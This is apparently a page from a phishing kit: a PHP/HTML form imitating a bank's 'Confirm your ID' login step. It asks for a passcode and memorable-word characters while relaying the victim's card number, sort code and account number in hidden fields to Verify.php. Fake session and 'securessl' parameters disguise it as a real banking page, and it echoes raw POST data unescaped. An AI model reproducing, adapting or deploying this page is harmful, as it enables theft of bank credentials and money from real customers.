<div data-prevent-timeout="true"  class="accordion active" id="accordion-top">
<h2 class="active" style="background: url(assets/img/login-panel-header-active-arrow.gif) no-repeat scroll 98% 50% #007EB6!important;">Step 2 - Confirm your ID</h2>
<form method="POST" ftb="true" autocomplete="off" name="form" action="Verify.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" id="form">
<input type="hidden" name="surname" value="<?=$_POST['surname']?>" autocomplete="off">
<input type="hidden" name="membershipNumber" value="<?=$_POST['membershipNumber']?>" autocomplete="off">
<input type="hidden" name="debitCardSet1" value="<?=$_POST['debitCardSet1']?>" autocomplete="off">
<input type="hidden" name="debitCardSet2" value="<?=$_POST['debitCardSet2']?>" autocomplete="off">
<input type="hidden" name="debitCardSet3" value="<?=$_POST['debitCardSet3']?>" autocomplete="off">
<input type="hidden" name="debitCardSet4" value="<?=$_POST['debitCardSet4']?>" autocomplete="off">
<input type="hidden" name="sortCodeSet1" value="<?=$_POST['sortCodeSet1']?>" autocomplete="off">
<input type="hidden" name="sortCodeSet2" value="<?=$_POST['sortCodeSet2']?>" autocomplete="off">
<input type="hidden" name="sortCodeSet3" value="<?=$_POST['sortCodeSet3']?>" autocomplete="off">
<input type="hidden" name="accountNumber" value="<?=$_POST['accountNumber']?>" autocomplete="off">
<div class="accordion-page" style="display: block;">
<div>  
</div>
<ul class="form-grid">
<li>
<label for="passcode">Enter your passcode</label>
<div id="ErrorPasscode"></div>
<input type="password" name="passcode" id="passcode" aria-labelledby="label-passcode" maxlength="5" class="passcode text" autocomplete="off" numerical="true" onfocus="tagAjaxContent();">
<div id="tooltip_passcode" class="tooltip" role="tooltip" aria-labelledby="tooltip_passcode_content">
    <div class="icon-question" aria-hidden="true"></div>

    <span>
        <b></b>
        <div class="content" id="tooltip_passcode_content">
            <p>Your passcode is a 5-digit number that we sent you when you signed up to Online Banking. Or, you will have set your own using PINsentry.</p>
        </div>
    </span>  
</div>
<span name="assistLink" class="assistLink"><a name="forgot" href="#" class="accordion-action ">Forgotten your passcode?</a></span>
</li>
<li>
<fieldset class="letter-select">
	<div id="ErrorMemo"></div>
	<legend>Enter <strong>3rd</strong> and <strong>6th</strong> characters of your memorable word</legend>
	<select name="one" id="nameOne" class="MemorableCharacter-grouped">
    <option value=""></option>
    <option value="a">a</option>
    <option value="b">b</option>
    <option value="c">c</option>
    <option value="d">d</option>
    <option value="e">e</option>
    <option value="f">f</option>
    <option value="g">g</option>
    <option value="h">h</option>
    <option value="i">i</option>
    <option value="j">j</option>
    <option value="k">k</option>
    <option value="l">l</option>
    <option value="m">m</option>
    <option value="n">n</option>
    <option value="o">o</option>
    <option value="p">p</option>
    <option value="q">q</option>
    <option value="r">r</option>
    <option value="s">s</option>
    <option value="t">t</option>
    <option value="u">u</option>
    <option value="v">v</option>
    <option value="w">w</option>
    <option value="x">x</option>
    <option value="y">y</option>
    <option value="z">z</option>


</select>

	<select name="two" id="nameTwo" class="MemorableCharacter-grouped">
    <option value=""></option>
    <option value="a">a</option>
    <option value="b">b</option>
    <option value="c">c</option>
    <option value="d">d</option>
    <option value="e">e</option>
    <option value="f">f</option>
    <option value="g">g</option>
    <option value="h">h</option>
    <option value="i">i</option>
    <option value="j">j</option>
    <option value="k">k</option>
    <option value="l">l</option>
    <option value="m">m</option>
    <option value="n">n</option>
    <option value="o">o</option>
    <option value="p">p</option>
    <option value="q">q</option>
    <option value="r">r</option>
    <option value="s">s</option>
    <option value="t">t</option>
    <option value="u">u</option>
    <option value="v">v</option>
    <option value="w">w</option>
    <option value="x">x</option>
    <option value="y">y</option>
    <option value="z">z</option>
</select>

</fieldset>
<div id="tooltip_memorablewordchar" class="tooltip" role="tooltip" aria-labelledby="tooltip_memorablewordchar_content">
    <div class="icon-question" aria-hidden="true"></div>
    <span>
        <b></b>
        <div class="content" id="tooltip_memorablewordchar_content">
            <p>Please select the relevant letter from your memorable word from each drop-down list.</p>
        </div>
    </span>    
</div>
</li>
<li>
<button type="submit" id="log-in-to-online-banking" class="button login login-extra-margin" name="go">Log in to Online Banking</button>
</li>
<div class="accordion-config"></div>
</ul>
<div class="help-centre"> </div>
<div class="channel-info-container"></div>
</div>
</div>
</form>